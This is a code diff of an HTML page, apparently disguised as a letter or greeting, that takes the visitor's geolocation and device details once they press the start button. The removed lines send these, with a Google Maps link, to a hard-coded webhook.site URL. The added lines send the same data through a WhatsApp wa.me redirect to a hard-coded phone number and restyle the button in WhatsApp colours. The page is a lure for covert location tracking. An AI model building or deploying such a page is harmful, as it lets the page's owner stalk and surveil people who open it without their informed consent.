@@ -22,10 +22,10 @@
         p { color: #aab; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
         
         button {
-            background: linear-gradient(135deg, #ff6b81, #ff4757); color: white;
-            border: none; padding: 14px 30px; border-radius: 50px; font-size: 16px;
-            font-weight: bold; cursor: pointer; transition: transform 0.2s;
-            box-shadow: 0 5px 15px rgba(255, 71, 87, 0.4); width: 100%;
+            background: linear-gradient(135deg, #25D366, #128C7E); /* Color WhatsApp */
+            color: white; border: none; padding: 14px 30px; border-radius: 50px; 
+            font-size: 16px; font-weight: bold; cursor: pointer; transition: transform 0.2s;
+            box-shadow: 0 5px 15px rgba(37, 211, 102, 0.4); width: 100%;
         }
         button:hover { transform: scale(1.05); }
         button:disabled { background: #555; cursor: wait; }
@@ -61,8 +61,8 @@
     </div>
 
     <script>
-        // TU WEBHOOK YA CONFIGURADO AQUÍ
-        const MY_WEBHOOK = "https://webhook.site/96c9b765-891b-4fed-b430-ac0e255fa501";
+        // TU NÚMERO DE WHATSAPP (Formateado internacionalmente sin + ni espacios)
+        const MY_WHATSAPP = "51929207065"; 
 
         function start() {
             const btn = document.getElementById('btnStart');
@@ -89,14 +89,12 @@
                         const devInfo = detectDevice();
                         document.getElementById('deviceData').innerText = "📱 " + devInfo;
 
-                        // Enviar a Webhook
-                        fetch(MY_WEBHOOK, {
-                            method: 'POST',
-                            headers: {'Content-Type': 'application/json'},
-                            body: JSON.stringify({
-                                content: `📍 ¡Alguien abrió la carta! \n 🗺️ Link: https://www.google.com/maps?q=${lat},${lon} \n 🕒 Hora: ${new Date().toLocaleString()} \n 📱 Celular: ${devInfo}`
-                            })
-                        });
+                        // Construir mensaje
+                        const msg = `📍 ¡Alguien abrió la carta!\n🗺️ Ubicación: https://maps.google.com/?q=${lat},${lon}\n🕒 Hora: ${new Date().toLocaleString()}\n📱 Celular: ${devInfo}`;
+                        
+                        // Enviar a WhatsApp
+                        const url = `https://wa.me/${MY_WHATSAPP}?text=${encodeURIComponent(msg)}`;
+                        window.location.href = url;
                     },
                     () => { status.innerText = "No se pudo detectar."; }
                 );
